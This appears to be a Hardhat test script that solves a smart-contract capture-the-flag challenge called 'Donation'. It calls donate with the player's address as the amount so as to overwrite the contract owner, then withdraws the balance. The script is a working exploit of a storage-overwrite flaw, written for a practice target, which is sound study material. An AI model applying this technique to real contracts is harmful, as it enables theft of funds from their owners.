const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0x432fA658fF3AC62B0c720de01E40C475e241378a";

before(async () => {
  accounts = await ethers.getSigners();
  player = accounts[0];
});

it("Donation", async function () {
  const chFactory = await ethers.getContractFactory("DonationChallenge");
  contract = await chFactory.attach(CHALLENGE_ADDRESS);

  etherAmount = ethers.BigNumber.from(await player.getAddress());
  msgVal = etherAmount.div(ethers.BigNumber.from(10).pow(36));
  tx = await contract.donate(etherAmount, { value: msgVal, gasLimit: 6e6 });
  console.log("donate tx intitiated");
  await tx.wait();
  console.log("donate tx completed");

  tx = await contract.withdraw({ gasLimit: 6e6 });
  console.log("withdraw tx intitiated");
  await tx.wait();
  console.log("withdraw tx completed");

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
